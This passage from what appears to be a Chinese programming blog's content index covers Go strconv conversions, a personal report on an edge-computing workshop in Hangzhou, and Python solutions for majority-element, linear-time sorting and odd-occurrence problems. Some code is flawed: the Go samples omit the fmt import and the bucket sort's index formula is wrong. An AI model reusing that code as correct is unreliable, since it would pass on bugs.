<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"><span class="keyword">import</span> <span class="string">"strconv"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="comment">// 整型转字符串</span></div><div class="line">	<span class="keyword">var</span> i = <span class="number">10</span>	<span class="comment">// 默认类型为int</span></div><div class="line">	iTos := strconv.FormatInt(<span class="keyword">int64</span>(i), <span class="number">10</span>)	<span class="comment">// 注意，传入参数的类型必须匹配</span></div><div class="line">	fmt.Printf(<span class="string">"%T, %q\n"</span>, iTos, iTos)</div><div class="line"></div><div class="line">	<span class="comment">// 浮点型转字符串</span></div><div class="line">	<span class="keyword">var</span> f = <span class="number">23.23</span>	<span class="comment">// 默认类型为float64</span></div><div class="line">	fTos := strconv.FormatFloat(f, <span class="string">'f'</span>, <span class="number">4</span>, <span class="number">64</span>)</div><div class="line">	fmt.Printf(<span class="string">"%T, %q\n"</span>, fTos, fTos)</div><div class="line"></div><div class="line">	<span class="comment">// 布尔型转字符串</span></div><div class="line">	<span class="keyword">var</span> b = <span class="literal">true</span></div><div class="line">	bTos := strconv.FormatBool(b)</div><div class="line">	fmt.Printf(<span class="string">"%T, %q\n"</span>, bTos, bTos)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">string, &quot;10&quot;</div><div class="line">string, &quot;23.2300&quot;</div><div class="line">string, &quot;true&quot;</div></pre></td></tr></table></figure>
<h4 id="String-转基本数据类型"><a href="#String-转基本数据类型" class="headerlink" title="String 转基本数据类型"></a>String 转基本数据类型</h4><h5 id="strconv-1"><a href="#strconv-1" class="headerlink" title="strconv"></a>strconv</h5><p>　　使用 <code>strconv</code> 包中的函数：</p>
<ul>
<li>字符串转整型</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ParseInt</span><span class="params">(s <span class="keyword">string</span>, base <span class="keyword">int</span>, bitSize <span class="keyword">int</span>)</span> <span class="params">(i <span class="keyword">int64</span>, err error)</span></span></div><div class="line"><span class="title">func</span> <span class="title">ParseUint</span><span class="params">(s <span class="keyword">string</span>, base <span class="keyword">int</span>, bitSize <span class="keyword">int</span>)</span> <span class="params">(n <span class="keyword">uint64</span>, err error)</span></div><div class="line"><span class="title">func</span> <span class="title">Atoi</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="params">(i <span class="keyword">int</span>, err error)</span></div></pre></td></tr></table></figure>
<p>　　<code>ParseInt</code> 返回字符串表示的整数值，接受正负号。<code>ParseUint</code> 则不接受正负号，用于无符号整型。<code>base</code> 指定进制（2 到 36），如果 base 为 0，则会从字符串前置判断，”0x” 是 16 进制，”0”是 8 进制，否则是 10 进制；<code>bitSize</code> 指定结果必须能无溢出赋值的整数类型，<code>0、8、16、32、64</code> 分别代表 <code>int、int8、int16、int32、int64</code>；返回的 err 是 *NumErr 类型的，如果语法有误，err.Error = ErrSyntax；如果结果超出类型范围err.Error = ErrRange。</p>
<ul>
<li>字符串转浮点型</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ParseFloat</span><span class="params">(s <span class="keyword">string</span>, bitSize <span class="keyword">int</span>)</span> <span class="params">(f <span class="keyword">float64</span>, err error)</span></span></div></pre></td></tr></table></figure>
<p>　　<code>ParseFloat</code> 解析一个表示浮点数的字符串并返回其值。<code>bitSize</code> 指定转换结果的类型，32 是 <code>float32</code>（返回值可以不改变精确值的赋值给 float32），64 是 <code>float64</code>；返回值 err 是 *NumErr 类型的，语法有误的，err.Error=ErrSyntax；结果超出表示范围的，返回值 f 为 ±Inf，err.Error= ErrRange。</p>
<ul>
<li>字符串转布尔型</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ParseBool</span><span class="params">(str <span class="keyword">string</span>)</span> <span class="params">(value <span class="keyword">bool</span>, err error)</span></span></div></pre></td></tr></table></figure>
<p>　　<code>ParseBool</code> 返回字符串表示的 <code>bool</code> 值。它接受 <code>1、0、t、f、T、F、true、false、True、False、TRUE、FALSE</code>，否则返回错误。</p>
<p>　　示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"><span class="keyword">import</span> <span class="string">"strconv"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="comment">// 字符串转整型</span></div><div class="line">	<span class="keyword">var</span> is = <span class="string">"100"</span></div><div class="line">	sToi, _ := strconv.ParseInt(is, <span class="number">10</span>, <span class="number">32</span>)</div><div class="line">	fmt.Printf(<span class="string">"%T, %d\n"</span>, sToi, sToi)</div><div class="line"></div><div class="line">	<span class="comment">// 字符串转浮点型</span></div><div class="line">	<span class="keyword">var</span> fs = <span class="string">"23.23"</span></div><div class="line">	sTof, _ := strconv.ParseFloat(fs, <span class="number">32</span>)</div><div class="line">	fmt.Printf(<span class="string">"%T, %f\n"</span>, sTof, sTof)</div><div class="line"></div><div class="line">	<span class="comment">// 字符串转布尔型</span></div><div class="line">	<span class="keyword">var</span> bs = <span class="string">"true"</span></div><div class="line">	sTob, _ := strconv.ParseBool(bs)</div><div class="line">	fmt.Printf(<span class="string">"%T, %t\n"</span>, sTob, sTob)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">int64, 100</div><div class="line">float64, 23.230000</div><div class="line">bool, true</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>在杭州-聊聊边缘计算</title>
    <url>/2019/05/18/%E5%9C%A8%E6%9D%AD%E5%B7%9E-%E8%81%8A%E8%81%8A%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<center>第三届边缘计算技术研讨会-杭州。</center>

<a id="more"></a>
<p>　　上周末，有幸到美丽的杭州-西子湖畔参加第三届边缘计算技术研讨会，认真聆听了边缘计算领域大佬们的报告，也结交了一些朋友，受益匪浅。大会邀请了华为、中国移动、海康威视、Xilinx、虹软科技等国内外在边缘计算领域的知名企业专家和浙江大学、华中科技大学、杭州电子科技大学、国防科大、中山大学、韦恩州立大学等国内外高校从事相关研究的知名学者做大会主题报告，涵盖了边缘计算的不同应用场景，从边缘体系结构、边缘操作系统、云边融合、边缘安全及隐私等方面对边缘计算各方面的最新进展进行讨论和交流。</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/5/18-1.jpg" alt="18-1"></p>
<p>　　杭州，一座美丽而有活力的城市。第一次来杭州，短短三天时间，杭州给我印象最深的两件事，一是有序的交通，之前在网上看到杭州的司机会给过马路的行人让路，到杭州之后感触颇深。司机都很礼貌，只要有人过，都会停下来等，这足够的耐心让人感觉非常舒服；二是，杭州的早餐，那真的是一绝。豆浆、豆腐脑那一股纯正的味道，鸡蛋饼的香味，油而不腻的蒸饺和小笼包，悠闲地吃个这样的早餐，然后到西湖边散散步，这就是向往的生活吧。另外，整体感受也是两方面的，一是，穿梭在车水马龙的杭州市区，时不时又是一辆特斯拉，各种跑车、豪车随处可见，果然还是江浙沪比较富裕，另外，各种新能源汽车，公交车都是电动车，可见杭州对于生态环境的重视；二是，西湖的美也是让人陶醉，让我感觉十分舒服，西湖附近茂密的植被，湖里快乐的鱼儿，悠闲游玩的行人，都不像一座大城市的样子。</p>
<p>　　说说边缘计算，它作为一种新的计算模式，可以通过将计算服务从云端扩展到数据源附近的边缘来节省带宽，降低服务延迟，从而提供更好的实时性能。传统的云计算模式，将数据全部传到云端，不仅带来巨大的带宽消耗，还会带来一些安全与隐私的问题。因此，云计算在物联网、车联网等领域就会存在很多挑战。另外，在对实时性具有极高要求的自动驾驶场景中，从客户端到云计算数据中心的网络延迟可能就会给系统带来较大的问题。因此，边缘计算对于很多新兴领域有着重要的意义，个人认为一定会非常有前景。研讨会的Panel环节也有大佬提到，一个领域如果能够引起产业界的关注并投入大量的资金，至少证明，这个领域有足够的前景，至于以后会不会真的有意义，我们先努力去做，等几年再看。我们也很高兴看到很多企业都已经由实际落地的项目，也有一些在做平台，比如华为的IEF以及其开源的KubeEdge项目、阿里云的Link Edge平台等等。相信还会有更多优秀的研究和解决方案不断涌现，让我们拭目以待。</p>
<p>　　再谈谈这次参会感触最深的两点：学术和学历。学术。再一次深刻感受到，推动社会进步、科技发展的学术与只为了发论文、拿项目的学术的区别。国内有些学者并不关注实际的，只关注发了几篇SCI，关注JCR或中科院分区，关注论文能不能为自己申报项目贴金。有一些学者，一年可以搞几十篇SCI，可是从来不参加学术会议，只在实验室闭门造车，他们深知期刊论文的套路，然后用公式去堆积论文，从来不考虑他的论文对实际的贡献。然而，在现行的评价体制下傲，这样依然可以拿到一年好几十万的绩效奖。在边缘计算这个领域，也出现了很多不切实际的论文，关注最多的还是任务卸载方面的，但是现在连边缘计算系统模型都还不明确，就开始研究如何调度。不像云计算中的调度问题，大多都是现存的需要解决的问题，设计的方案可以实际部署下去。实际上，边缘计算系统现在缺的也不是这样的任务调度模型，而是更加接地气的系统架构、解决方案，即杀手级的应用。现在学术圈也不乏一些质疑的声音，比如边缘计算会不会真的就只是边缘，相比云计算来说，边缘计算不可能变得那么重要等等。因此，边缘计算领域领航人们就更希望边缘计算能够有更多接地气的研究，以便更好地推动边缘计算的发展，而不是在一片质疑声中慢慢没落。也还好，边缘计算几位核心的大佬们都比较关注实际的东西，有意义有价值的研究，很多大牛也提到，现在很多计算任务卸载的研究，实际上都没法落地，其中蹭热点的居多，并不能推动边缘计算的发展。因此，这次研讨会邀请的大会报告将近一半来自产业界，几乎都是一些已经落地或者在探索的实际项目，这对边缘计算的发展具有举足轻重的作用。其实，很多时候，一些学者也不想去做这样的研究，但是面对现行“唯论文”的评价机制，很多人其实没有办法。关于学术评价机制，现在也有一些学校开始改革，效果如何，我们静观其变吧，这里就不多谈了。</p>
<p>　　学历。这次参会也深刻地感受到学历的重要，来参加会议的除了少数本科生，其他基本都是研究生以上，能在会上作报告的，基本都是博士学历。本以为到企业以后学历就并不是那么重要了，但是，来自企业的作报告的大佬基本都是博士学位。与来自企业的朋友交流也发现，在这种新兴的领域，他们更希望招博士，还向我打听有没有毕业以后愿意去企业的博士。虽然我毕业以后可能不会马上去读博士了，但是以后有机会还是可以深造一下，说不定哪天有了足够的资金支持我继续提升自己呢。有人说，当你处在不同的圈子你才会感受到学历的重要性，如果你身边的朋友都是低学历，你可能永远也不会觉得学历有多重要。不来参加这次研讨会可能不会觉得学历有多重要，觉得自己拿个硕士学位已经够了。虽然学历并不能决定一切，但是很多时候他很方便的可以将你带入一个圈子，要不然你可能连进门的机会都没有，或者说要进这个门都要想很多的办法。最近也和朋友聊到，等到中年，不做技术，要转管理的时候，去读一个MBA或者EMBA还是很有用的。一点点意外的收获吧，希望以后自己也可以成为那么优秀的人。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>找出数组中出现次数超过一半的数</title>
    <url>/2019/04/27/%E6%89%BE%E5%87%BA%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E8%B6%85%E8%BF%87%E4%B8%80%E5%8D%8A%E7%9A%84%E6%95%B0/</url>
    <content><![CDATA[<p>　　数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。</p>
<a id="more"></a>
<h4 id="计数-比较"><a href="#计数-比较" class="headerlink" title="计数+比较"></a>计数+比较</h4><p>　　不考虑效率，采用最简单的办法，遍历数组，使用 List 的 count() 方法统计元素出现的次数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">more_than_half_num</span><span class="params">(arr)</span>:</span></div><div class="line">    half = len(arr) // <span class="number">2</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arr:</div><div class="line">        <span class="keyword">if</span> arr.count(i) &gt; half:</div><div class="line">            <span class="keyword">return</span> i</div><div class="line">    <span class="keyword">return</span> <span class="keyword">None</span></div></pre></td></tr></table></figure>
<p>　　构造一个map，key为元素的值，value为元素出现的次数，然后遍历map找到目标元素：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">more_than_half_num</span><span class="params">(arr)</span>:</span></div><div class="line">    dict = &#123;&#125;</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arr:</div><div class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> dict:</div><div class="line">            dict[i] += <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            dict[i] = <span class="number">1</span></div><div class="line"></div><div class="line">    half = len(arr) // <span class="number">2</span></div><div class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> dict.items():</div><div class="line">        <span class="keyword">if</span> v &gt; half:</div><div class="line">            <span class="keyword">return</span> k</div><div class="line">    <span class="keyword">return</span> <span class="keyword">None</span></div></pre></td></tr></table></figure>
<h4 id="排序-中位数"><a href="#排序-中位数" class="headerlink" title="排序+中位数"></a>排序+中位数</h4><p>　　数组排序后，如果符合条件的数存在，则一定是数组中间那个数。可使用排序算法对数组进行排序，然后求排序后数组的中间数 + 判断中间数出现次数是否超过数组的一半。下面以快速排序为例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">part_sort</span><span class="params">(arr, left, right)</span>:</span></div><div class="line">    key = right</div><div class="line">    <span class="keyword">while</span> left &lt; right:</div><div class="line">        <span class="keyword">while</span> left &lt; right <span class="keyword">and</span> arr[left] &lt;= arr[key]:</div><div class="line">            left += <span class="number">1</span></div><div class="line">        <span class="keyword">while</span> left &lt; right <span class="keyword">and</span> arr[right] &gt;= arr[key]:</div><div class="line">            right -= <span class="number">1</span></div><div class="line">        arr[left], arr[right] = arr[right], arr[left]</div><div class="line">        print(arr)</div><div class="line">    arr[left], arr[key] = arr[key], arr[left]</div><div class="line">    <span class="keyword">return</span> left</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">quick_sort</span><span class="params">(arr, left, right)</span>:</span></div><div class="line">    <span class="keyword">if</span> left &gt;= right:</div><div class="line">        <span class="keyword">return</span></div><div class="line">    index = part_sort(arr, left, right)</div><div class="line">    quick_sort(arr, left, index - <span class="number">1</span>)</div><div class="line">    quick_sort(arr, index, right)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">more_than_half_num</span><span class="params">(arr)</span>:</span></div><div class="line">    length = len(arr)</div><div class="line">    quick_sort(arr, <span class="number">0</span>, length - <span class="number">1</span>)</div><div class="line">    res = arr[length // <span class="number">2</span>]</div><div class="line">    <span class="keyword">if</span> arr.count(res) &gt; length // <span class="number">2</span>:</div><div class="line">        <span class="keyword">return</span> res</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">    	<span class="keyword">return</span> <span class="keyword">None</span></div></pre></td></tr></table></figure>
<h4 id="一次遍历"><a href="#一次遍历" class="headerlink" title="一次遍历"></a>一次遍历</h4><p>　　数组中有一个数字出现的次数超过数组长度的一半，也就是说出现的次数比其他所有数字出现次数的和还要多。因此我们可以考虑在遍历数组的时候利用两个辅助变量，一个记录数字出现的次数，一个记录数字。</p>
<ul>
<li>当我们遍历到下一个数字的时候，如果下一个数字和我们之前保存的数字相同，则次数加1；</li>
<li>如果下一个数字和我们之前保存的数字不同，则次数减1。</li>
<li>如果次数为零，我们需要保存下一个数字，并把次数设为1。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">more_than_half_num</span><span class="params">(arr)</span>:</span></div><div class="line">    res = arr[<span class="number">0</span>]</div><div class="line">    cnt = <span class="number">1</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(arr)):</div><div class="line">        <span class="keyword">if</span> arr[i] == res:</div><div class="line">            cnt += <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            cnt -= <span class="number">1</span></div><div class="line">        <span class="keyword">if</span> cnt == <span class="number">0</span>:</div><div class="line">            res = arr[i]</div><div class="line">            cnt = <span class="number">1</span></div><div class="line">    <span class="keyword">if</span> arr.count(res) &gt; len(arr)//<span class="number">2</span>:</div><div class="line">        <span class="keyword">return</span> res</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Basic</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>线性时间排序</title>
    <url>/2019/04/22/%E7%BA%BF%E6%80%A7%E6%97%B6%E9%97%B4%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<center>基础算法复习：线性时间排序。</center>

<a id="more"></a>
<h4 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a>计数排序</h4><h5 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h5><p>　　计数排序核心是将输入的数据值转化为键存储在额外开辟的数组空间中，其基本思想一是：在排序之前，先统计遍历源数组，得到最大值 max 和最小值 min，然后开辟一个长度为 max-min+1 的计数数组，计数数组中 index 的元素记录的值是原数组中某元素出现的次数，遍历原数组进行计数，最后按顺序输出计数数组中不为0的元素，如果出现多次，则输出多次。</p>
<p>　　例如要排序的数组为 [5, 3, 4, 7, 2, 4, 3, 4, 7]，最大值为 7，最小值为 2，所以计数数组的长度为 6，然后按照下图的方式，记录每个数出现的次数，最后遍历计数数组进行输出。</p>
<p><img src="https://www.itcodemonkey.com/data/upload/portal/20181130/1543563127822705.gif" alt="6-1"></p>
<p>　　具体可参考 <code>五分钟学算法</code> 公众号的文章：<a href="https://mp.weixin.qq.com/s/VFssRgok_LrtLdGAgpmmNg" target="_blank" rel="external">【图解数据结构】 一组动画彻底理解计数排序</a></p>
<h5 id="Python-实现"><a href="#Python-实现" class="headerlink" title="Python 实现"></a>Python 实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">counting_sort</span><span class="params">(nums)</span>:</span></div><div class="line">    max_num = max(nums)</div><div class="line">    min_num = min(nums)</div><div class="line">    length = max_num - min_num + <span class="number">1</span></div><div class="line">    src = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(length)]  <span class="comment"># 计数数组</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nums:  <span class="comment"># 计数</span></div><div class="line">        tmp = i - min_num</div><div class="line">        src[tmp] += <span class="number">1</span></div><div class="line"></div><div class="line">    res = []</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(src)):  <span class="comment"># 输出</span></div><div class="line">        <span class="keyword">while</span> src[j]:</div><div class="line">            src[j] -= <span class="number">1</span></div><div class="line">            res.append(j + min_num)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
<p>　　计数排序是一种非常快捷的稳定排序方法，时间复杂度和空间复杂度均为 <code>O(n+k)</code>，其中 n 为要排序的数的个数，k 为要排序的数组的最大值。</p>
<p>　　计数排序的是消耗空间复杂度来优化时间复杂度的排序方法，对一定量的整数排序时候的速度非常快，一般快于其他排序算法。但计数排序局限性比较大，作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数。</p>
<h5 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><ul>
<li>平均时间复杂度：O(n+k)。</li>
<li>最优时间复杂度：O(n+k)。</li>
<li>最坏时间复杂度：O(n+k)。</li>
<li>空间复杂度：O(k)。</li>
<li>稳定性：稳定。</li>
</ul>
<h4 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h4><h5 id="基本思路-1"><a href="#基本思路-1" class="headerlink" title="基本思路"></a>基本思路</h5><p>　　桶排序是一种基于计数的排序算法，工作的原理是将数组分到有限数量的桶里。每个桶再分别排序（有可能再使用别的排序算法或是以递归方式继续使用桶排序进行排序）。</p>
<p>　　简单来说就是设置 n 个数组当作空桶子。遍历数组，并且把项目一个一个放到对应的桶子去。对每个不是空的桶子进行排序。从不是空的桶子里把项目再放回原来的数组中。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_gif/D67peceibeIRxSzm8QgeCjyuoZkKQTwmH2JMcBXRPyZGWFJnslhoGNFyyhS7q0wP23CfTlGY6vwkvjG4GoklERw/640?wx_fmt=gif&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt="6-1"></p>
<p>　　具体可参考 <code>五分钟学算法</code> 公众号的文章：<a href="https://mp.weixin.qq.com/s?__biz=MzUyNjQxNjYyMg==&amp;mid=2247484058&amp;idx=1&amp;sn=a7aa08a7decbba40d8af7b3c6a62cf5a&amp;chksm=fa0e6d1bcd79e40d6ec21c64efb2115b3ffa51b3128814e0702f35682b7c85e4c5edb03e3ad1&amp;mpshare=1&amp;scene=23&amp;srcid=0410qidshPPk1Xsv4S6rmDPD#rd" target="_blank" rel="external">【图解数据结构】 一组动画彻底理解桶排序</a></p>
<h5 id="Python-实现-1"><a href="#Python-实现-1" class="headerlink" title="Python 实现"></a>Python 实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bucket_sort</span><span class="params">(nums, n)</span>:</span></div><div class="line">    bucket = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> range(n)]</div><div class="line"></div><div class="line">    max_num = max(nums)</div><div class="line">    min_num = min(nums)</div><div class="line">    gap = (max_num - min_num + <span class="number">1</span>) // <span class="number">5</span>  <span class="comment"># 确定每个桶的范围</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nums:  <span class="comment"># 放进桶中</span></div><div class="line">        index = i // (gap + min_num)</div><div class="line">        bucket[index].append(i)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):  <span class="comment"># 桶内排序</span></div><div class="line">        bucket[i].sort()</div><div class="line"></div><div class="line">    index = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):  <span class="comment"># 输出</span></div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(bucket[i])):</div><div class="line">            nums[index] = bucket[i][j]</div><div class="line">            index += <span class="number">1</span></div><div class="line">    <span class="keyword">return</span> nums</div></pre></td></tr></table></figure>
<h5 id="时间复杂度-1"><a href="#时间复杂度-1" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><ul>
<li>平均时间复杂度：O(n+k)。</li>
<li>最优时间复杂度：O(n+k)。</li>
<li>最坏时间复杂度：O(n**2)。</li>
<li>空间复杂度：O(n+k)。</li>
<li>稳定性：稳定。</li>
</ul>
<h4 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h4><h5 id="基本思路-2"><a href="#基本思路-2" class="headerlink" title="基本思路"></a>基本思路</h5><p>　　基数排序是桶排序的扩展，它的基本思想是：将整数按位数切割成不同的数字，然后按每个位数分别比较。具体做法是：将所有待比较数值统一为同样的数位长度，数位较短的数前面补零。通过将要比较的位（个位、十位、百位…），将要排序的元素分配至 0~9 个桶中，从最低位开始，依次进行一次排序。这样从最低位排序一直到最高位排序完成以后，得到的数组就是有序的。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_gif/D67peceibeIRxSzm8QgeCjyuoZkKQTwmHCLZibj46Jc2eWhdXhTG48Mr9nU3j6qOIV0u0tLncNWdpddlWC1dsBtg/640?wx_fmt=gif&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt="6-1"></p>
<p>　　具体可参考 <code>五分钟学算法</code> 公众号的文章：<a href="https://mp.weixin.qq.com/s?__biz=MzUyNjQxNjYyMg==&amp;mid=2247484076&amp;idx=1&amp;sn=fb551e1eb83cd483c7a963cbc432e4bd&amp;chksm=fa0e6d2dcd79e43bc4387b3fd89c61dcc084a4e7396c453d9194f0ae357f1cf725eabd39ebb9&amp;mpshare=1&amp;scene=23&amp;srcid=0410Ptmkag9vVRF4VBpbybG4#rd" target="_blank" rel="external">【图解数据结构】 一组动画彻底理解基数排序</a></p>
<h5 id="Python-实现-2"><a href="#Python-实现-2" class="headerlink" title="Python 实现"></a>Python 实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">RadixSort</span><span class="params">(nums)</span>:</span></div><div class="line">    n = <span class="number">1</span></div><div class="line">    max_num = max(nums)</div><div class="line">    <span class="keyword">while</span> max_num &gt; <span class="number">10</span> ** n:  <span class="comment"># 得到最大数是几位数</span></div><div class="line">        n += <span class="number">1</span></div><div class="line"></div><div class="line">    i = <span class="number">0</span>  <span class="comment"># 从个位开始</span></div><div class="line">    <span class="keyword">while</span> i &lt; n:</div><div class="line">        bucket = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>)]  <span class="comment"># 初始化桶</span></div><div class="line"></div><div class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> nums:  <span class="comment"># 对每一位进行排序</span></div><div class="line">            radix = int((x / (<span class="number">10</span> ** i)) % <span class="number">10</span>)  <span class="comment"># 得到每位的基数</span></div><div class="line">            bucket[radix].append(x)  <span class="comment"># 加入对应基数的桶中</span></div><div class="line"></div><div class="line">        j = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">            <span class="keyword">if</span> len(bucket[k]) != <span class="number">0</span>:  <span class="comment"># 若桶不为空</span></div><div class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> bucket[k]:  <span class="comment"># 将该桶中每个元素</span></div><div class="line">                    nums[j] = y  <span class="comment"># 放回到数组中</span></div><div class="line">                    j += <span class="number">1</span></div><div class="line">        i += <span class="number">1</span></div><div class="line">    <span class="keyword">return</span> nums</div></pre></td></tr></table></figure>
<h5 id="时间复杂度-2"><a href="#时间复杂度-2" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><ul>
<li>平均时间复杂度：O(nxk)。</li>
<li>最优时间复杂度：O(nxk)。</li>
<li>最坏时间复杂度：O(nxk)。</li>
<li>空间复杂度：O(n+k)。</li>
<li>稳定性：稳定。</li>
</ul>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Basic</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>查找数组中出现奇数次的那个数字</title>
    <url>/2019/04/16/%E6%9F%A5%E6%89%BE%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%A5%87%E6%95%B0%E6%AC%A1%E7%9A%84%E9%82%A3%E4%B8%AA%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<p>　　有一个数组，其中的数都是以偶数次的形式出现，只有一个数出现的次数为奇数次，要求找出这个出现次数为奇数次的数。</p>
<a id="more"></a>
<h4 id="集合-统计"><a href="#集合-统计" class="headerlink" title="集合+统计"></a>集合+统计</h4><h5 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h5><p>　　最简单能想到的，效率不高。利用集合的特性，通过 Python 的 set() 函数筛选出数组中有哪些数，然后遍历集合，使用 List 的 count 方法统计集合中每个元素在数组中出现的次数，如果是奇数次则直接返回该数。</p>
<h5 id="Python-实现"><a href="#Python-实现" class="headerlink" title="Python 实现"></a>Python 实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_odd_times_num</span><span class="params">(arr)</span>:</span></div><div class="line">    num = set(arr)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> num:</div><div class="line">        <span class="keyword">if</span> arr.count(i) % <span class="number">2</span> != <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> i</div></pre></td></tr></table></figure>
<h4 id="排序-遍历"><a href="#排序-遍历" class="headerlink" title="排序+遍历"></a>排序+遍历</h4><h5 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h5><p>　　将数组从小到大排序，然后遍历数组，并对出现的数进行计数b，当出现不同的数时，判断上一个数出现次数是奇数还是偶数。</p>
<h5 id="Python-实现-1"><a href="#Python-实现-1" class="headerlink" title="Python 实现"></a>Python 实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_odd_times_num</span><span class="params">(arr)</span>:</span></div><div class="line">    arr.sort()</div><div class="line">    cnt = <span class="number">1</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(arr)):</div><div class="line">        <span class="keyword">if</span> arr[i] != arr[i - <span class="number">1</span>]:</div><div class="line">            <span class="keyword">if</span> cnt % <span class="number">2</span> != <span class="number">0</span>:</div><div class="line">                <span class="keyword">return</span> arr[i<span class="number">-1</span>]</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                cnt = <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div 